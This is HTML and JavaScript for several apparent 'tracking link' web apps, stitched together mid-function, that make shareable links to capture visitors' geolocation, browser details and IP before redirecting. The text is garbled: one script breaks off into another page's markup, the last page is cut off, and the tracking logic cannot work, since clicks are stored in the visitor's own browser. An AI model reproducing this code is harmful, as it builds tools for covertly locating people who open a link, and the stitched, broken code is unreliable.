<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LinkTracker Pro - Advanced URL Tracking Platform</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary: #2563eb;
            --secondary: #1e40af;
            --accent: #3b82f6;
            --light: #f8fafc;
            --dark: #1e293b;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
        }
        
        .glass-effect {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        
        .card-hover {
            transition: all 0.3s ease;
        }
        
        .card-hover:hover {
            transform: translateY(-5px);
            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
        }
        
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 1rem;
        }
        
        .tracking-link {
            background: linear-gradient(45deg, var(--primary), var(--secondary));
            color: white;
            padding: 0.5rem 1rem;
            border-radius: 0.5rem;
            font-family: monospace;
            word-break: break-all;
        }
        
        .map-container {
            height: 300px;
            background: #e5e7eb;
            border-radius: 0.5rem;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            overflow: hidden;
        }
        
        .pulse {
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); opacity: 1; }
            50% { transform: scale(1.05); opacity: 0.8; }
            100% { transform: scale(1); opacity: 1; }
        }
        
        .loading-spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid var(--primary);
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body class="min-h-screen py-8 px-4">
    <div class="max-w-6xl mx-auto">
        <!-- Header -->
        <header class="text-center mb-12">
            <h1 class="text-4xl font-bold text-white mb-4">
                <i class="fas fa-link mr-3"></i>LinkTracker Pro
            </h1>
            <p class="text-white/80 text-lg">Create tracking links that capture location data and analytics</p>
        </header>

        <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">
            <!-- Left Sidebar - Stats -->
            <div class="lg:col-span-1">
                <div class="glass-effect rounded-2xl p-6 text-white mb-6">
                    <h2 class="text-xl font-semibold mb-4">Dashboard Overview</h2>
                    <div class="stats-grid">
                        <div class="text-center p-4 bg-white/10 rounded-lg">
                            <i class="fas fa-link text-2xl mb-2"></i>
                            <div class="text-3xl font-bold" id="total-links">0</div>
                            <div class="text-sm">Total Links</div>
                        </div>
                        <div class="text-center p-4 bg-white/10 rounded-lg">
                            <i class="fas fa-eye text-2xl mb-2"></i>
                            <div class="text-3xl font-bold" id="total-clicks">0</div>
                            <div class="text-sm">Total Clicks</div>
                        </div>
                    </div>
                </div>

                <div class="glass-effect rounded-2xl p-6 text-white">
                    <h2 class="text-xl font-semibold mb-4">Quick Actions</h2>
                    <button onclick="showCreateForm()" class="w-full bg-white text-blue-600 py-2 px-4 rounded-lg font-semibold mb-3 hover:bg-blue-50 transition">
                        <i class="fas fa-plus mr-2"></i>Create New Link
                    </button>
                    <button onclick="exportData()" class="w-full bg-white/10 text-white py-2 px-4 rounded-lg font-semibold hover:bg-white/20 transition">
                        <i class="fas fa-download mr-2"></i>Export Data
                    </button>
                </div>
            </div>

            <!-- Main Content -->
            <div class="lg:col-span-2">
                <!-- Create Link Form -->
                <div id="create-form" class="glass-effect rounded-2xl p-6 text-white mb-6">
                    <h2 class="text-xl font-semibold mb-4">Create Tracking Link</h2>
                    <form id="tracking-form" class="space-y-4">
                        <div>
                            <label class="block text-sm font-medium mb-2">Link Name</label>
                            <input type="text" id="link-name" required 
                                   class="w-full bg-white/10 border border-white/20 rounded-lg px-4 py-2 text-white placeholder-white/50 focus:outline-none focus:ring-2 focus:ring-white"
                                   placeholder="e.g., Marketing Campaign A">
                        </div>
                        <div>
                            <label class="block text-sm font-medium mb-2">Destination URL</label>
                            <input type="url" id="destination-url" required 
                                   class="w-full bg-white/10 border border-white/20 rounded-lg px-4 py-2 text-white placeholder-white/50 focus:outline-none focus:ring-2 focus:ring-white"
                                   placeholder="https://example.com" value="https://">
                        </div>
                        <div class="flex space-x-4">
                            <button type="submit" class="flex-1 bg-white text-blue-600 py-2 px-4 rounded-lg font-semibold hover:bg-blue-50 transition">
                                <i class="fas fa-magic mr-2"></i>Generate Link
                            </button>
                            <button type="button" onclick="hideCreateForm()" class="flex-1 bg-white/10 text-white py-2 px-4 rounded-lg font-semibold hover:bg-white/20 transition">
                                Cancel
                            </button>
                        </div>
                    </form>
                </div>

                <!-- Generated Link Display -->
                <div id="generated-link" class="glass-effect rounded-2xl p-6 text-white mb-6 hidden">
                    <h2 class="text-xl font-semibold mb-4">Your Tracking Link is Ready!</h2>
                    <div class="bg-white/10 rounded-lg p-4 mb-4">
                        <div class="tracking-link mb-2" id="tracking-url"></div>
                        <button onclick="copyToClipboard()" class="text-sm bg-white/20 text-white py-1 px-3 rounded hover:bg-white/30">
                            <i class="fas fa-copy mr-1"></i>Copy Link
                        </button>
                    </div>
                    <div class="text-sm text-white/80">
                        <p><i class="fas fa-info-circle mr-2"></i>This link will capture location data, device info, and timestamp when clicked.</p>
                    </div>
                </div>

                <!-- Tracking Links List -->
                <div class="glass-effect rounded-2xl p-6 text-white">
                    <div class="flex justify-between items-center mb-4">
                        <h2 class="text-xl font-semibold">Your Tracking Links</h2>
                        <button onclick="refreshData()" class="text-white/80 hover:text-white">
                            <i class="fas fa-sync-alt"></i>
                        </button>
                    </div>
                    
                    <div id="links-container" class="space-y-4">
                        <div class="text-center py-8 text-white/60">
                            <i class="fas fa-link text-4xl mb-4"></i>
                            <p>No tracking links created yet</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // Initialize data storage
        let trackingLinks = JSON.parse(localStorage.getItem('trackingLinks')) || [];
        
        // Check if this is a tracking link view
        const urlParams = new URLSearchParams(window.location.search);
        const trackId = urlParams.get('track');
        
        if (trackId) {
            // This is a tracking link being opened - capture data
            handleTrackingClick(trackId);
        } else {
            // Normal dashboard view
            updateDashboard();
            loadTrackingLinks();
        }
        
        // Form submission
        document.getElementById('tracking-form').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const linkName = document.getElementById('link-name').value;
            const destinationUrl = document.getElementById('destination-url').value;
            
            // Generate unique ID
            const trackId = generateUniqueId();
            const trackingUrl = `${window.location.origin}${window.location.pathname}?track=${trackId}`;
            
            // Create tracking link object
            const trackingLink = {
                id: trackId,
                name: linkName,
                destination: destinationUrl,
                trackingUrl: trackingUrl,
                createdAt: new Date().toISOString(),
                clicks: []
            };
            
            // Save to storage
            trackingLinks.push(trackingLink);
            localStorage.setItem('trackingLinks', JSON.stringify(trackingLinks));
            
            // Show generated link
            document.getElementById('tracking-url').textContent = trackingUrl;
            document.getElementById('generated-link').classList.remove('hidden');
            
            // Update dashboard
            updateDashboard();
            loadTrackingLinks();
            
            // Reset form
            this.reset();
            document.getElementById('destination-url').value = 'https://';
        });
        
        function generateUniqueId() {
            return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
        }
        
        function updateDashboard() {
            const totalLinks = trackingLinks.length;
            const totalClicks = trackingLinks.reduce((sum, link) => sum + link.clicks.length, 0);
            
            document.getElementById('total-links').textContent = totalLinks;
            document.getElementById('total-clicks').textContent = totalClicks;
        }
        
        function loadTrackingLinks() {
            const container = document.getElementById('links-container');
            
            if (trackingLinks.length === 0) {
                container.innerHTML = `
                    <div class="text-center py-8 text-white/60">
                        <i class="fas fa-link text-4xl mb-4"></i>
                        <p>No tracking links created yet</p>
                    </div>
                `;
                return;
            }
            
            container.innerHTML = trackingLinks.map(link => `
                <div class="card-hover bg-white/5 rounded-lg p-4">
                    <div class="flex justify-between items-start mb-3">
                        <h3 class="font-semibold">${link.name}</h3>
                        <span class="text-sm text-white/60">${formatDate(link.createdAt)}</span>
                    </div>
                    
                    <div class="mb-3">
                        <div class="text-sm text-white/80 mb-1">Destination:</div>
                        <div class="text-sm truncate">${link.destination}</div>
                    </div>
                    
                    <div class="flex justify-between items-center mb-3">
                        <div class="text-sm">
                            <i class="fas fa-mouse-pointer mr-1"></i> ${link.clicks.length} clicks
                        </div>
                        <button onclick="viewLinkDetails('${link.id}')" class="text-sm text-blue-300 hover:text-blue-100">
                            View Details
                        </button>
                    </div>
                    
                    <div class="bg-white/10 rounded p-2">
                        <div class="text-xs font-mono truncate">${link.trackingUrl}</div>
                    </div>
                </div>
            `).join('');
        }
        
        function viewLinkDetails(linkId) {
            const link = trackingLinks.find(l => l.id === linkId);
            if (!link) return;
            
            const modalContent = `
                <div class="fixed inset-0 bg-black/50 flex items-center justify-center z-50 p-4">
                    <div class="bg-white rounded-2xl max-w-2xl w-full max-h-[80vh] overflow-y-auto">
                        <div class="p-6 border-b">
                            <div class="flex justify-between items-center">
                                <h3 class="text-xl font-semibold">${link.name}</h3>
                                <button onclick="closeModal()" class="text-gray-400 hover:text-gray-600">
                                    <i class="fas fa-times"></i>
                                </button>
                            </div>
                        </div>
                        
                        <div class="p-6">
                            <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
                                <div>
                                    <h4 class="font-semibold mb-2">Link Information</h4>
                                    <div class="space-y-2 text-sm">
                                        <div><strong>Created:</strong> ${formatDate(link.createdAt)}</div>
                                        <div><strong>Clicks:</strong> ${link.clicks.length}</div>
                                        <div><strong>Destination:</strong> ${link.destination}</div>
                                    </div>
                                </div>
                                
                                <div>
                                    <h4 class="font-semibold mb-2">Tracking URL</h4>
                                    <div class="bg-gray-100 p-3 rounded text-sm font-mono break-all">
                                        ${link.trackingUrl}
                                    </div>
                                    <button onclick="copySpecificLink('${link.trackingUrl}')" class="mt-2 text-sm text-blue-600 hover:text-blue-800">
                                        Copy URL
                                    </button>
                                </div>
                            </div>
                            
                            <h4 class="font-semibold mb-4">Click History (${link.clicks.length})</h4>
                            
                            ${link.clicks.length > 0 ? `
                                <div class="space-y-3">
                                    ${link.clicks.map(click => `
                                        <div class="border rounded-lg p-3">
                                            <div class="flex justify-between items-start mb-2">
                                                <div class="font-medium">${formatDate(click.timestamp)}</div>
                                                <div class="text-sm text-gray-600">
                                                    ${click.location ? `${click.location.city || 'Unknown'}, ${click.location.country || 'Unknown'}` : 'Location unavailable'}
                                                </div>
                                            </div>
                                            <div class="text-sm space-y-1">
                                                <div>IP: ${click.ip || 'Unknown'}</div>
                                                <div>Device: ${click.device || 'Unknown'}</div>
                                                <div>Browser: ${click.browser || 'Unknown'}</div>
                                                ${click.location ? `
                                                    <div>Coordinates: ${click.location.latitude}, ${click.location.longitude}</div>
                                                ` : ''}
                                            </div>
                                        </div>
                                    `).reverse().join('')}
                                </div>
                            ` : `
                                <div class="text-center py-8 text-gray-500">
                                    <i class="fas fa-mouse-pointer text-3xl mb-3"></i>
                                    <p>No clicks recorded yet</p>
                                </div>
                            `}
                        </div>
                    </div>
                </div>
            `;
            
            const modal = document.createElement('div');
            modal.innerHTML = modalContent;
            document.body.appendChild(modal);
        }
        
        function closeModal() {
            const modal = document.querySelector('.fixed.inset-0');
            if (modal) modal.remove();
        }
        
        function copySpecificLink(url) {
            navigator.clipboard.writeText(url).then(() => {
                alert('Link copied to clipboard!');
            });
        }
        
        function copyToClipboard() {
            const url = document.getElementById('tracking-url').textContent;
            navigator.clipboard.writeText(url).then(() => {
                alert('Tracking link copied to clipboard!');
            });
        }
        
        function showCreateForm() {
            document.getElementById('create-form').classList.remove('hidden');
        }
        
        function hideCreateForm() {
            document.getElementById('create-form').classList.add('hidden');
            document.getElementById('generated-link').classList.add('hidden');
        }
        
        function refreshData() {
            trackingLinks = JSON.parse(localStorage.getItem('trackingLinks')) || [];
            updateDashboard();
            loadTrackingLinks();
        }
        
        function exportData() {
            const dataStr = JSON.stringify(trackingLinks, null, 2);
            const dataUri = 'data:application/json;charset=utf-8,'+ encodeURIComponent(dataStr);
            
            const exportFileDefaultName = 'tracking-links.json';
            
            const linkElement = document.createElement('a');
            linkElement.setAttribute('href', dataUri);
            linkElement.setAttribute('download', exportFileDefaultName);
            linkElement.click();
        }
        
        function formatDate(dateString) {
            return new Date(dateString).toLocaleDateString() + ' ' + new Date(dateString).toLocaleTimeString();
        }
        
        async function handleTrackingClick(trackId) {
            // Find the tracking link
            const linkIndex = trackingLinks.findIndex(l => l.id === trackId);
                       </div>
            </div>
            <h1 class="text-4xl md:text-5xl font-bold text-white mb-4">Secure Link Tracker</h1>
            <p class="text-xl text-white opacity-90">Create tracking links with location detection and auto-deletion</p>
        </header>

        <!-- Main Content -->
        <main class="max-w-4xl mx-auto">
            <!-- Create Link Section -->
            <div class="bg-white rounded-2xl shadow-2xl p-6 mb-8 card-hover">
                <h2 class="text-2xl font-semibold text-gray-800 mb-6 flex items-center">
                    <i class="fas fa-plus-circle text-purple-600 mr-3"></i>
                    Create New Tracking Link
                </h2>
                
                <div class="mb-6">
                    <label class="block text-sm font-medium text-gray-700 mb-2">Link Destination URL</label>
                    <div class="relative">
                        <input type="url" id="destinationUrl" 
                               class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:border-transparent"
                               placeholder="https://example.com" 
                               required>
                        <div class="absolute inset-y-0 right-0 flex items-center pr-3">
                            <i class="fas fa-globe text-gray-400"></i>
                        </div>
                    </div>
                </div>

                <div class="mb-6">
                    <label class="block text-sm font-medium text-gray-700 mb-2">Link Name (Optional)</label>
                    <input type="text" id="linkName" 
                           class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:border-transparent"
                           placeholder="My Tracking Link">
                </div>

                <button onclick="createTrackingLink()" 
                        class="w-full bg-gradient-to-r from-purple-600 to-indigo-600 text-white py-3 px-6 rounded-lg font-semibold hover:from-purple-700 hover:to-indigo-700 transition-all duration-200 flex items-center justify-center">
                    <i class="fas fa-bolt mr-2"></i>
                    Generate Tracking Link
                </button>
            </div>

            <!-- Generated Link Display -->
            <div id="generatedLinkSection" class="hidden bg-white rounded-2xl shadow-2xl p-6 mb-8 card-hover">
                <h2 class="text-2xl font-semibold text-gray-800 mb-4 flex items-center">
                    <i class="fas fa-link text-green-600 mr-3"></i>
                    Your Tracking Link
                </h2>
                <div class="bg-gray-50 rounded-lg p-4 mb-4">
                    <div class="flex items-center justify-between">
                        <span id="generatedLink" class="text-sm md:text-base font-mono text-gray-800 break-all"></span>
                        <button onclick="copyToClipboard()" class="ml-4 bg-gray-200 hover:bg-gray-300 px-3 py-2 rounded-lg text-sm">
                            <i class="fas fa-copy"></i>
                        </button>
                    </div>
                </div>
                <div class="text-sm text-gray-600 flex items-center">
                    <i class="fas fa-clock text-orange-500 mr-2"></i>
                    This link will automatically delete in <span id="countdown">20:00</span>
                </div>
            </div>

            <!-- Active Links Section -->
            <div class="bg-white rounded-2xl shadow-2xl p-6">
                <h2 class="text-2xl font-semibold text-gray-800 mb-6 flex items-center">
                    <i class="fas fa-list text-blue-600 mr-3"></i>
                    Active Tracking Links
                </h2>
                
                <div id="activeLinks" class="space-y-4">
                    <div class="text-center py-8 text-gray-500">
                        <i class="fas fa-inbox text-4xl mb-3"></i>
                        <p>No active tracking links</p>
                    </div>
                </div>
            </div>
        </main>

        <!-- Footer -->
        <footer class="text-center mt-12 text-white opacity-75">
            <p>Created with <i class="fas fa-heart text-red-400"></i> - Links auto-delete after 20 minutes</p>
        </footer>
    </div>

    <script>
        // Initialize data storage
        let trackingLinks = JSON.parse(localStorage.getItem('trackingLinks')) || [];
        let deletionTimers = {};

        // Generate UUID for unique tracking IDs
        function generateUUID() {
            return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
                const r = Math.random() * 16 | 0;
                const v = c === 'x' ? r : (r & 0x3 | 0x8);
                return v.toString(16);
            });
        }

        // Create a new tracking link
        function createTrackingLink() {
            const destinationUrl = document.getElementById('destinationUrl').value.trim();
            const linkName = document.getElementById('linkName').value.trim() || 'Untitled Link';

            if (!destinationUrl) {
                alert('Please enter a destination URL');
                return;
            }

            const trackingId = generateUUID();
            const trackingUrl = `${window.location.origin}${window.location.pathname}?track=${trackingId}`;
            
            const newLink = {
                id: trackingId,
                name: linkName,
                destination: destinationUrl,
                trackingUrl: trackingUrl,
                createdAt: new Date().toISOString(),
                clicks: [],
                expiresAt: new Date(Date.now() + 20 * 60 * 1000).toISOString()
            };

            trackingLinks.push(newLink);
            localStorage.setItem('trackingLinks', JSON.stringify(trackingLinks));

            // Show generated link
            document.getElementById('generatedLink').textContent = trackingUrl;
            document.getElementById('generatedLinkSection').classList.remove('hidden');

            // Start countdown
            startCountdown(newLink.expiresAt);

            // Set deletion timer
            deletionTimers[trackingId] = setTimeout(() => {
                deleteLink(trackingId);
            }, 20 * 60 * 1000);

            updateActiveLinks();
        }

        // Start countdown timer
        function startCountdown(expiresAt) {
            const countdownElement = document.getElementById('countdown');
            const targetTime = new Date(expiresAt).getTime();

            function updateCountdown() {
                const now = new Date().getTime();
                const distance = targetTime - now;

                if (distance <= 0) {
                    countdownElement.textContent = '00:00';
                    return;
                }

                const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
                const seconds = Math.floor((distance % (1000 * 60)) / 1000);

                countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                
                if (distance > 0) {
                    setTimeout(updateCountdown, 1000);
                }
            }

            updateCountdown();
        }

        // Copy to clipboard
        function copyToClipboard() {
            const link = document.getElementById('generatedLink').textContent;
            navigator.clipboard.writeText(link).then(() => {
                alert('Link copied to clipboard!');
            });
        }

        // Delete a tracking link
        function deleteLink(trackingId) {
            trackingLinks = trackingLinks.filter(link => link.id !== trackingId);
            localStorage.setItem('trackingLinks', JSON.stringify(trackingLinks));
            
            if (deletionTimers[trackingId]) {
                clearTimeout(deletionTimers[trackingId]);
                delete deletionTimers[trackingId];
            }

            updateActiveLinks();
        }

        // Update active links display
        function updateActiveLinks() {
            const container = document.getElementById('activeLinks');
            
            if (trackingLinks.length === 0) {
                container.innerHTML = `
                    <div class="text-center py-8 text-gray-500">
                        <i class="fas fa-inbox text-4xl mb-3"></i>
                        <p>No active tracking links</p>
                    </div>
                `;
                return;
            }

            container.innerHTML = trackingLinks.map(link => {
                const created = new Date(link.createdAt);
                const expires = new Date(link.expiresAt);
                const timeLeft = Math.max(0, expires - Date.now());
                const minutesLeft = Math.floor(timeLeft / 60000);
                
                return `
                    <div class="border border-gray-200 rounded-lg p-4 hover:bg-gray-50 transition-colors">
                        <div class="flex justify-between items-start mb-3">
                            <div>
                                <h3 class="font-semibold text-gray-800">${link.name}</h3>
                                <p class="text-sm text-gray-600">${link.destination}</p>
                            </div>
                            <span class="bg-${minutesLeft < 5 ? 'red' : 'orange'}-100 text-${minutesLeft < 5 ? 'red' : 'orange'}-800 text-xs px-2 py-1 rounded-full">
                                ${minutesLeft}m left
                            </span>
                        </div>
                        
                        <div class="flex items-center justify-between text-sm">
                            <span class="text-gray-500">
                                <i class="fas fa-mouse-pointer mr-1"></i>
                                ${link.clicks.length} clicks
                            </span>
                            <div class="flex space-x-2">
                                <button onclick="copyLink('${link.trackingUrl}')" class="text-blue-600 hover:text-blue-800">
                                    <i class="fas fa-copy"></i> Copy
                                </button>
                                <button onclick="deleteLink('${link.id}')" class="text-red-600 hover:text-red-800">
                                    <i class="fas fa-trash"></i> Delete
                                </button>
                            </div>
                        </div>

                        ${link.clicks.length > 0 ? `
                            <div class="mt-3 pt-3 border-t border-gray-200">
                                <h4 class="font-medium text-sm text-gray-700 mb-2">Recent Clicks:</h4>
                                ${link.clicks.slice(-3).map(click => `
                                    <div class="text-xs text-gray-600 mb-1">
                                        <i class="fas fa-map-marker-alt mr-1"></i>
                                        ${click.location || 'Location unavailable'} - 
                                        ${new Date(click.timestamp).toLocaleString()}
                                    </div>
                                `).join('')}
                            </div>
                        ` : ''}
                    </div>
                `;
            }).join('');
        }

        // Copy specific link
        function copyLink(url) {
            navigator.clipboard.writeText(url).then(() => {
                alert('Link copied to clipboard!');
            });
        }

        // Handle tracking URL parameter
        function handleTracking() {
            const urlParams = new URLSearchParams(window.location.search);
            const trackingId = urlParams.get('track');

            if (trackingId) {
                const link = trackingLinks.find(l => l.id === trackingId);
                
                if (link) {
                    // Track the click with location
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            const location = `${position.coords.latitude}, ${position.coords.longitude}`;
                            link.clicks.push({
                                timestamp: new Date().toISOString(),
                                location: location,
                                userAgent: navigator.userAgent
                            });
                            localStorage.setItem('trackingLinks', JSON.stringify(trackingLinks));
                            window.location.href = link.destination;
                        },
                        (error) => {
                            // Location access denied or unavailable
                            link.clicks.push({
                                timestamp: new Date().toISOString(),
                                location: null,
                                userAgent: navigator.userAgent
                            });
                            localStorage.setItem('trackingLinks', JSON.stringify(trackingLinks));
                            window.location.href = link.destination;
                        }
                    );

                    // Prevent further execution
                    return;
                }
            }
        }

        // Initialize the application
        function initApp() {
            handleTracking();
            updateActiveLinks();
            
            // Restart deletion timers for existing links
            trackingLinks.forEach(link => {
                const expiresAt = new Date(link.expiresAt).getTime();
                const timeLeft = expiresAt - Date.now();
                
                if (timeLeft > 0) {
                    deletionTimers[link.id] = setTimeout(() => {
                        deleteLink(link.id);
                    }, timeLeft);
                } else {
                    // Link has expired, delete it
                    deleteLink(link.id);
                }
            });
        }

        // Initialize when DOM is loaded
        document.addEventListener('DOMContentLoaded', initApp);
    </script>
</body>
</html>

    <!-- Header -->
    <header class="gradient-bg text-white py-8">
        <div class="container mx-auto px-4">
            <div class="flex items-center justify-between">
                <div>
                    <h1 class="text-3xl md:text-4xl font-bold mb-2">
                        <i class="fas fa-link mr-3"></i>Location Tracker Links
                    </h1>
                    <p class="text-blue-100">Create tracking links that capture visitor locations</p>
                </div>
                <div class="w-16 h-16 bg-white/20 rounded-full flex items-center justify-center">
                    <i class="fas fa-map-marker-alt text-2xl text-white"></i>
                </div>
            </div>
        </div>
    </header>

    <!-- Main Content -->
    <main class="container mx-auto px-4 py-8">
        <!-- Create Link Section -->
        <div class="bg-white rounded-lg shadow-lg p-6 mb-8">
            <h2 class="text-2xl font-semibold text-gray-800 mb-6">
                <i class="fas fa-plus-circle mr-2 text-blue-500"></i>Create New Tracking Link
            </h2>
            
            <form id="createLinkForm" class="space-y-4">
                <div>
                    <label for="linkName" class="block text-sm font-medium text-gray-700 mb-2">
                        <i class="fas fa-tag mr-2"></i>Link Name
                    </label>
                    <input 
                        type="text" 
                        id="linkName" 
                        required 
                        placeholder="e.g., Marketing Campaign #1"
                        class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                    >
                </div>
                
                <div>
                    <label for="destinationUrl" class="block text-sm font-medium text-gray-700 mb-2">
                        <i class="fas fa-external-link-alt mr-2"></i>Destination URL (Optional)
                    </label>
                    <input 
                        type="url" 
                        id="destinationUrl" 
                        placeholder="https://your-website.com"
                        class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                    >
                </div>

                <button 
                    type="submit" 
                    class="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 px-6 rounded-lg transition duration-200 flex items-center justify-center"
                >
                    <i class="fas fa-magic mr-2"></i>Generate Tracking Link
                </button>
            </form>
        </div>

        <!-- Active Links Section -->
        <div class="bg-white rounded-lg shadow-lg p-6">
            <h2 class="text-2xl font-semibold text-gray-800 mb-6">
                <i class="fas fa-list mr-2 text-green-500"></i>Active Tracking Links
            </h2>
            
            <div id="linksContainer" class="space-y-4">
                <div class="text-center py-12 text-gray-500" id="noLinksMessage">
                    <i class="fas fa-link text-4xl mb-4 opacity-50"></i>
                    <p>No tracking links created yet. Create your first link above!</p>
                </div>
            </div>
        </div>
    </main>

    <!-- Modal for New Link -->
    <div id="linkModal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center hidden">
        <div class="bg-white rounded-lg p-6 m-4 max-w-md w-full">
            <h3 class="text-xl font-semibold text-gray-800 mb-4">
                <i class="fas fa-check-circle text-green-500 mr-2"></i>Tracking Link Created!
            </h3>
            <p class="text-gray-600 mb-4">Your tracking link is ready. Share this URL:</p>
            <div class="bg-gray-100 p-3 rounded-lg mb-4">
                <input 
                    type="text" 
                    id="generatedLink" 
                    readonly 
                    class="w-full bg-transparent border-none outline-none text-blue-600 font-mono text-sm"
                >
            </div>
            <button 
                onclick="copyToClipboard()" 
                class="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-2 px-4 rounded-lg mb-2"
            >
                <i class="fas fa-copy mr-2"></i>Copy Link
            </button>
            <button 
                onclick="closeModal()" 
                class="w-full bg-gray-200 hover:bg-gray-300 text-gray-800 font-semibold py-2 px-4 rounded-lg"
            >
                Close
            </button>
        </div>
    </div>

    <!-- Tracking Script -->
    <script>
        // Initialize storage
        let trackingLinks = JSON.parse(localStorage.getItem('trackingLinks')) || [];
        
        // Check if this is a tracking link visit
        const urlParams = new URLSearchParams(window.location.search);
        const trackId = urlParams.get('track');
        
        if (trackId) {
            // This is a tracking link visit - capture location and redirect
            trackVisit(trackId);
        } else {
            // Normal visit - display the dashboard
            displayLinks();
        }

        // Form submission handler
        document.getElementById('createLinkForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const linkName = document.getElementById('linkName').value;
            const destinationUrl = document.getElementById('destinationUrl').value || 'https://example.com';
            
            // Generate unique ID
            const trackId = generateUniqueId();
            const trackingLink = `${window.location.origin}${window.location.pathname}?track=${trackId}&dest=${encodeURIComponent(destinationUrl)}`;
            
            // Create link object
            const linkObject = {
                id: trackId,
                name: linkName,
                trackingUrl: trackingLink,
                destination: destinationUrl,
                createdAt: new Date().toISOString(),
                visits: []
            };
            
            // Save to storage
            trackingLinks.unshift(linkObject);
            localStorage.setItem('trackingLinks', JSON.stringify(trackingLinks));
            
            // Show modal with generated link
            document.getElementById('generatedLink').value = trackingLink;
            document.getElementById('linkModal').classList.remove('hidden');
            
            // Reset form
            this.reset();
        });

        function generateUniqueId() {
            return Date.now().toString(36) + Math.random().toString(36).substr(2);
        }

        function displayLinks() {
            const container = document.getElementById('linksContainer');
            const noLinksMessage = document.getElementById('noLinksMessage');
            
            if (trackingLinks.length === 0) {
                noLinksMessage.classList.remove('hidden');
                container.innerHTML = '';
                return;
            }
            
            noLinksMessage.classList.add('hidden');
            
            container.innerHTML = trackingLinks.map(link => `
                <div class="link-card bg-white border-l-4 border-blue-500 rounded-lg p-4 shadow-sm">
                    <div class="flex justify-between items-start mb-3">
                        <div>
                            <h3 class="font-semibold text-gray-800">${link.name}</h3>
                            <p class="text-sm text-gray-600">Created: ${new Date(link.createdAt).toLocaleDateString()}</p>
                        </div>
                        <span class="bg-blue-100 text-blue-800 text-xs font-medium px-2.5 py-0.5 rounded">
                            ${link.visits.length} visits
                        </span>
                    </div>
                    
                    <div class="mb-3">
                        <label class="block text-sm font-medium text-gray-700 mb-1">Tracking URL:</label>
                        <div class="flex items-center bg-gray-100 p-2 rounded">
                            <input 
                                type="text" 
                                value="${link.trackingUrl}" 
                                readonly 
                                class="flex-1 bg-transparent border-none outline-none text-blue-600 text-sm font-mono truncate"
                            >
                            <button onclick="copyLink('${link.trackingUrl}')" class="ml-2 text-blue-600 hover:text-blue-800">
                                <i class="fas fa-copy"></i>
                            </button>
                        </div>
                    </div>
                    
                    ${link.visits.length > 0 ? `
                        <div class="mt-4">
                            <h4 class="font-medium text-gray-700 mb-2">
                                <i class="fas fa-map-marker-alt mr-2 text-red-500"></i>Recent Visits
                            </h4>
                            <div class="space-y-2">
                                ${link.visits.slice(0, 3).map(visit => `
                                    <div class="flex items-center justify-between text-sm p-2 bg-gray-50 rounded">
                                        <div>
                                            <span class="font-medium">${visit.location || 'Unknown location'}</span>
                                            <div class="text-xs text-gray-500">
                                                ${new Date(visit.timestamp).toLocaleString()}
                                            </div>
                                        </div>
                                        <span class="text-xs text-gray-400">
                                            <i class="fas fa-globe mr-1"></i>${visit.browser || 'Unknown'}
                                        </span>
                                    </div>
                                `).join('')}
                            </div>
                        </div>
                    ` : `
                        <div class="text-center py-4 text-gray-500">
                            <i class="fas fa-map-marker-alt text-2xl mb-2 opacity-50"></i>
                            <p class="text-sm">No visits yet. Share your link to start tracking!</p>
                        </div>
                    `}
                </div>
            `).join('');
        }

        function copyLink(url) {
            navigator.clipboard.writeText(url).then(() => {
                alert('Link copied to clipboard!');
            });
        }

        function copyToClipboard() {
            const linkInput = document.getElementById('generatedLink');
            linkInput.select();
            navigator.clipboard.writeText(linkInput.value).then(() => {
                alert('Link copied to clipboard!');
            });
        }

        function closeModal() {
            document.getElementById('linkModal').classList.add('hidden');
            displayLinks(); // Refresh the links list
        }

        async function trackVisit(trackId) {
            try {
                // Find the link in storage
                const links = JSON.parse(localStorage.getItem('trackingLinks')) || [];
                const link = links.find(l => l.id === trackId);
                
                if (!link) {
                    window.location.href = 'https://example.com';
                    return;
                }

                // Get visitor information
                const visit = {
                    timestamp: new Date().toISOString(),
                    ip: await getIPAddress(),
                    browser: navigator.userAgent,
                    location: null
                };

                // Try to get precise location
                try {
                    const position = await new Promise((resolve, reject) => {
                        if (!navigator.geolocation) {
                            reject(new Error('Geolocation not supported'));
                            return;
